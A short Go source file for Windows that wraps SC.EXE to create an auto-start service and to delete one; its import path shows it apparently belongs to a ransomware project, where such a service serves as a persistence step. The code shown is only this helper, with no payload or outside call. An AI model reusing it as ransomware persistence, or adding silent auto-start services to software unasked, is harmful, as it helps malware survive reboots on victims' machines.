// +build windows

package win

import (
    "os/exec"

    "github.com/sug0/sr-ransomware/go/errors"
)

func InstallService(name, display, executable string) error {
    err := exec.Command(
        "SC.EXE",
        "CREATE", name,
        "start=", "auto",
        "DisplayName=", display,
        "binpath=", executable,
    ).Run()
    return errors.WrapIfNotNil(pkg, "failed to install service", err)
}

func RemoveService(name string) error {
    err := exec.Command("SC.EXE", "DELETE", name).Run()
    return errors.WrapIfNotNil(pkg, "failed to remove service", err)
}